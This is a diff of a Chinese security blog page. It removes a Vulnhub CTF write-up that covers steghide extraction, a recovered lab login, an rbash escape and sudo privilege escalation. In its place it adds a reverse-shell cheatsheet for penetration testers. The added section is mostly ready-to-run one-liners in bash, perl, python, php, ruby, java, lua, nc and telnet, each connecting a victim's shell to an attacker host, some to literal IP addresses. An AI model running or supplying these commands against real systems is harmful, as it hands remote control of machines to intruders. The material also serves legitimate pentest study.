@@ -6,28 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Vulnhub-Challenging-unknowndevice64-v1.0 | owefsad&#39;s blog</title>
+  <title>how get a reverse shell | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介打完之后回过头来看这个靶机, 其实挺简单的, 本渣卡在了两个地方:  看到web页面中的key_is_h1dd3n.jpg的注释时, 没有想到去访问一下看看; 查看sysud64程序的帮助文档后, 没有仔细看usage, 导致没有看到PROG、ARGS;  文章目录 端口扫描, 确定方向 steghide解隐写, 逆brainfuck得账号 vi逃逸rbash, sudoers配置提权限">
-<meta name="keywords" content="escalate_privilege,steghide,sudoers,reverse_rbash">
+  <meta name="description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
+<meta name="keywords" content="cheatsheet,reverse_shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub-Challenging-unknowndevice64-v1.0">
-<meta property="og:url" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/index.html">
+<meta property="og:title" content="how get a reverse shell">
+<meta property="og:url" content="http://yoursite.com/2019/04/24/how-get-a-reverse-shell/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
-<meta property="og:description" content="简介打完之后回过头来看这个靶机, 其实挺简单的, 本渣卡在了两个地方:  看到web页面中的key_is_h1dd3n.jpg的注释时, 没有想到去访问一下看看; 查看sysud64程序的帮助文档后, 没有仔细看usage, 导致没有看到PROG、ARGS;  文章目录 端口扫描, 确定方向 steghide解隐写, 逆brainfuck得账号 vi逃逸rbash, sudoers配置提权限">
+<meta property="og:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/open_port.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/web.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/h1dd3n.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/steghide.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/brainfuck_code.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/sudo_l.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/sysud64.png">
-<meta property="og:updated_time" content="2019-04-11T01:21:13.661Z">
+<meta property="og:updated_time" content="2019-04-24T04:39:27.052Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub-Challenging-unknowndevice64-v1.0">
-<meta name="twitter:description" content="简介打完之后回过头来看这个靶机, 其实挺简单的, 本渣卡在了两个地方:  看到web页面中的key_is_h1dd3n.jpg的注释时, 没有想到去访问一下看看; 查看sysud64程序的帮助文档后, 没有仔细看usage, 导致没有看到PROG、ARGS;  文章目录 端口扫描, 确定方向 steghide解隐写, 逆brainfuck得账号 vi逃逸rbash, sudoers配置提权限">
-<meta name="twitter:image" content="http://yoursite.com/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/open_port.png">
+<meta name="twitter:title" content="how get a reverse shell">
+<meta name="twitter:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -191,53 +183,46 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Vulnhub-Challenging-unknowndevice64-v1-0" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-how-get-a-reverse-shell" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Vulnhub-Challenging-unknowndevice64-v1.0
+      how get a reverse shell
     </h1>
   
 
         
-        <a href="/2019/03/31/Vulnhub-Challenging-unknowndevice64-v1-0/" class="archive-article-date">
-  	<time datetime="2019-03-31T00:37:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-31</time>
+        <a href="/2019/04/24/how-get-a-reverse-shell/" class="archive-article-date">
+  	<time datetime="2019-04-24T04:20:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-24</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介<br>打完之后回过头来看这个靶机, 其实挺简单的, 本渣卡在了两个地方:</p>
-<ol>
-<li>看到web页面中的<code>key_is_h1dd3n.jpg</code>的注释时, 没有想到去访问一下看看;</li>
-<li>查看<code>sysud64</code>程序的帮助文档后, 没有仔细看usage, 导致没有看到PROG、ARGS;</li>
-</ol>
+        <p>简介<br>渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet.</p>
+<p>状态: 持续总结中<br><a id="more"></a></p>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
-<li>端口扫描, 确定方向</li>
-<li>steghide解隐写, 逆brainfuck得账号</li>
-<li>vi逃逸rbash, sudoers配置提权限</li>
+<li>linux下创建反弹shell</li>
 </ul>
-<a id="more"></a>
-<h2 id="端口扫描-确定方向"><a href="#端口扫描-确定方向" class="headerlink" title="端口扫描, 确定方向"></a>端口扫描, 确定方向</h2><p>拿到靶机ip之后, 依然是先开始扫描IP, 如下:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -Pn -p- -A 172.16.88.129</span><br></pre></td></tr></table></figure></p>
-<p><img src="open_port.png" alt="open_port"><br>其中: 1337端口为7.7版本的OpenSSH, 暂无法直接利用, 可爆破, 先搁置; 31337端口为python的简单WEB服务器, 无robots.txt文件, 为优先考虑点.</p>
-<h2 id="steghide解隐写-逆brainfuck得账号"><a href="#steghide解隐写-逆brainfuck得账号" class="headerlink" title="steghide解隐写, 逆brainfuck得账号"></a>steghide解隐写, 逆brainfuck得账号</h2><p>访问31337端口后, 发现如下页面:<br><img src="web.png" alt="web_page"></p>
-<p>查看页面源码发现注释<code>key_is_h1dd3n.jpg</code>, 这里我犯了个傻, 看到这个之后依然选择用dirb爆破目录, 然后一无所获, 这时才想到访问一下试试, 如下图:<br><img src="h1dd3n.png" alt="key_is_h1dd3n.jpg"></p>
-<p>拿到图片之后, 根据图片名字的提示, 这肯定是一个隐写术的题, 于是开始对jpg文件进行隐写术的检查. 经过一番尝试(binwalk、stegdetect、stegsolve、steghide)之后发现只有steghide需要输入密码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ steghide info key_is_h1dd3n.jpg</span><br></pre></td></tr></table></figure></p>
-<p><img src="steghide.png" alt="key_is_h1dd3n.jpg"></p>
-<p>根据文件名提示输入<code>h1dd3n</code>解压stego文件(<code>steghide extract -sf key_is_h1dd3n.jpg</code>), 得到一串brainfuck代码, 如下图:</p>
-<p><img src="brainfuck_code.png" alt="brainfuck code"></p>
-<p>解码之后得到:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: ud64</span><br><span class="line">passwd: 1M!<span class="comment">#64@ud</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="Vi逃逸rbash-sudoers配置提权限"><a href="#Vi逃逸rbash-sudoers配置提权限" class="headerlink" title="Vi逃逸rbash, sudoers配置提权限"></a>Vi逃逸rbash, sudoers配置提权限</h2><p>用上面的额账号登陆ssh之后发现是个rbash, 根据rbash生存法则成功通过vi逃逸, 进入bash之后发现依然无法使用ls等基础命令, 于是添加环境变量<code>export PATH=$PATH:/bin:/usr/bin:/usr/local/bin</code><br>!(add_path)[add_path.png]</p>
-<p>先尝试<code>sudo -l</code>检查是否可通过sudoers配置提权, 然后惊奇的发现存在一个<code>sysud64</code>的程序<br><img src="sudo_l.png" alt="sudo -l"></p>
-<p>查看sysud64的帮助文档之后发现可直接执行<code>PROG</code>(根据直觉这应该是指program),于是尝试运行bash, 成功提权</p>
-<pre><code class="sh">$ sudo sysud64 -o /dev/null bash
-</code></pre>
-<p><img src="sysud64.png" alt="sysud64"></p>
-<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2>
+<h4 id="linux下反弹shell"><a href="#linux下反弹shell" class="headerlink" title="linux下反弹shell"></a>linux下反弹shell</h4><p>1.上传反弹文件（脚本、木马）</p>
+<p>2.bash：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/&lt;Attackip&gt;/&lt;Attackport&gt; 0 &gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>该命令在渗透测试中占据榜首多年, 是反弹 shell的首选命令, 但是在一些系统中无法成功运行, 目前在centos下实测过可正常反弹shell.</p>
+<p>3.perl：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">'use Socket;$i="&lt;Attackip&gt;";$p=&lt;Attackport&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
+<p>perl是linux系统中内置的解释器, 当bash命令无法反弹shell时, 优先选择该命令</p>
+<p>4.python：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Attackip&gt;",&lt;Attackport&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p>
+<p>5.php：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -r <span class="string">'$sock=fsockopen("&lt;Attackip&gt;",&lt;Attackport&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p>
+<p>6.ruby：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Attackip&gt;",&lt;Attackport&gt;).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure></p>
+<p>7.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure></p>
+<p>8.Lua：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('&lt;Attackip&gt;','&lt;Attackport&gt;');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure></p>
+<p>9.nc：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh &lt;Attackip&gt; &lt;Attackport&gt;</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Attackip&gt; &lt;Attackport&gt; &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure></p>
+<p>10.nc<br>1) 使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>2) 不使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Victim</span></span><br><span class="line">mknod /tmp/backpipe p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Victim</span></span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure></p>
+<p>11.telnet<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure></p>
+<h2 id="Metasploit创建反弹shell"><a href="#Metasploit创建反弹shell" class="headerlink" title="Metasploit创建反弹shell"></a>Metasploit创建反弹shell</h2>
       
 
       
@@ -250,19 +235,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">escalate_privilege</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">cheatsheet</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">steghide</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">sudoers</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">reverse_rbash</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">reverse_shell</a>
         		</li>
       		
 		</ul>
@@ -274,7 +251,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
+        			<a href="/categories/思路//" class="article-tag-list-link color3">思路</a>
         		</li>
       		
 		</ul>
@@ -292,18 +269,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/04/05/Vulnhub-Challenging-Born2Root-2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Vulnhub-Challenging-Born2Root-2
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/03/27/How-hacking-with-SUID/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">How hacking with SUID</div>
+    <a href="/2019/04/22/windows内网渗透思路/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">windows内网渗透思路</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -330,7 +298,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描-确定方向"><span class="toc-number">2.</span> <span class="toc-text">端口扫描, 确定方向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#steghide解隐写-逆brainfuck得账号"><span class="toc-number">3.</span> <span class="toc-text">steghide解隐写, 逆brainfuck得账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vi逃逸rbash-sudoers配置提权限"><span class="toc-number">4.</span> <span class="toc-text">Vi逃逸rbash, sudoers配置提权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束"><span class="toc-number">5.</span> <span class="toc-text">结束</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux下反弹shell"><span class="toc-number">1.0.1.</span> <span class="toc-text">linux下反弹shell</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit创建反弹shell"><span class="toc-number">2.</span> <span class="toc-text">Metasploit创建反弹shell</span></a></li>
                     </div>
                 </span>
             </div>
